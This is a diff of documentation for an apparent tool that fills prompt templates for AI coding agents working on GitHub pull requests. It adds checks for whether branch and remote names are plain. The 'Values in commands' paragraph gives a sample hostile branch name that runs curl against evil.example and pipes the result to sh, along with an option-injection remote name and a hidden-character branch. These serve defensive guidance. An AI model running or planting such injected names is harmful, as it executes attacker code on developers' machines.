@@ -3100,9 +3100,11 @@ a pull request's failing checks, then push the fix), and **Fix dep security** (f
 security checks on a bot's dependency update: move the vulnerable dependency to a version that
 fixes it, never silence a scanner, and push with one exact `git push` to the pull request's
 own branch, named by its full ref and quoted, never forced; for a fork's pull request, or
-another outside contributor's, it commits the fix but pushes nothing). A
+another outside contributor's, and for a branch or remote whose name isn't plain, it commits
+the fix but pushes nothing). A
 starter new in a later version is added to your library once, as these were, and a starter
-you never changed takes the new text when a later version changes it. Review and Work
+whose text you never changed takes the new text when a later version changes it, keeping the
+title and settings you gave it. Review and Work
 on it are the app's first
 defaults for pull requests and issues. From then on every prompt is yours to change, duplicate,
 or delete; a deleted starter is not added back. **Reset to original** restores a changed
@@ -3133,8 +3135,8 @@ syntax snippet in the cheat sheet inserts it at the caret.
 | Variable | What it holds |
 |---|---|
 | `.Kind`, `.IsPR`, `.Number`, `.Title`, `.URL`, `.Author`, `.IsBot`, `.Labels`, `.IsDraft` | The item: its kind ("pull request" or "issue"), number, title (cut to 200 characters), address, author, whether a bot opened it, label names, and whether a pull request is a draft |
-| `.Repo`, `.Owner`, `.RepoName`, `.DefaultBranch`, `.Remote` | The repository, and the clone's remote for it (such as `origin`, or `upstream` in a fork's clone; empty without a clone) |
-| `.Branch`, `.HeadCommit`, `.Checks`, `.FailedChecks`, `.Review`, `.HasConflicts`, `.Additions`, `.Deletions`, `.ChangedFiles`, `.Commits` | A pull request's head branch, its head commit (the one whose files the launch checked), its checks ("passing", "failing", "pending", or empty), its failed checks' names, separated by commas (empty when they aren't known), its review decision, whether it conflicts with its base, and its size; empty or zero for issues |
+| `.Repo`, `.Owner`, `.RepoName`, `.DefaultBranch`, `.Remote`, `.RemoteIsPlain` | The repository, the clone's remote for it (such as `origin`, or `upstream` in a fork's clone; empty without a clone), and whether that remote's name is plain (see Values in commands) |
+| `.Branch`, `.BranchIsPlain`, `.HeadCommit`, `.Checks`, `.FailedChecks`, `.Review`, `.HasConflicts`, `.Additions`, `.Deletions`, `.ChangedFiles`, `.Commits` | A pull request's head branch, whether its name is plain exactly as GitHub reported it (see Values in commands), its head commit (the one whose files the launch checked), its checks ("passing", "failing", "pending", or empty), its failed checks' names, separated by commas (empty when they aren't known), its review decision, whether it conflicts with its base, and its size; empty or zero for issues |
 | `.SensitiveFiles` | A checked pull request's [sensitive files](#sensitive-files), each with its category, as in ".github/workflows/ci.yml (Workflows)", separated by commas; empty when there are none, and for issues |
 | `.Dependency`, `.FromVersion`, `.ToVersion`, `.UpdateType` | For a bot's dependency update, what its title says: the dependency (as in `golang.org/x/net`), the versions it moves between, and how big the jump is (`patch`, `minor`, `major`); empty when the title doesn't say, for a person's pull request, and for issues |
 | `.InWorktree`, `.WorktreeOnPRHead`, `.Worktree`, `.Profile`, `.Me`, `.OutsideContributor` | The session: whether it starts in a worktree, whether that worktree is at the pull request's head, its name, the profile, your login, and whether the item comes from an outside contributor |
@@ -3152,11 +3154,16 @@ trimmed and runs of blank lines collapse to one.
 
 **Values in commands.** A branch, a title, or a label is whatever its author typed, and git
 takes a branch named `x;$(curl${IFS}evil.example|sh)`. Put such a value into a command the agent
-should run through `shellquote`, as in `` `git checkout {{shellquote .Branch}}` ``: it writes
+should run through `shellquote`, as in `` `git switch {{shellquote .Branch}}` ``: it writes
 the value as one word, as it is when every shell reads it as itself, or else in single quotes,
-so the shell never runs any of it. A number needs no quoting, nor do `.Repo`, `.Owner`, and
-`.RepoName`, which GitHub keeps to letters, digits, and `-_.`, nor `.HeadCommit`, which is
-hex.
+so the shell never runs any of it. Quoting can't stop everything a name can do, though: git
+reads a remote named `--upload-pack=…` as an option, and a branch named `ma<LRM>in`, with a
+hidden left-to-right mark that every value loses on its way into a prompt, shows as `main`. So
+name a branch or a remote in a command only under `{{if .BranchIsPlain}}` or
+`{{if .RemoteIsPlain}}`, which hold when the name, exactly as given, is ASCII letters, digits,
+and `-_./:,+@%=` alone and doesn't start with `-`, as every Dependabot and Renovate branch is.
+A number needs no quoting, nor do `.Repo`, `.Owner`, and `.RepoName`, which GitHub keeps to
+letters, digits, and `-_.`, nor `.HeadCommit`, which is hex.
 
 **Checking.** Every edit is checked as you type, by the same Go template package that fills
 the prompt in at launch. Each problem is listed under the editor with its line and column and
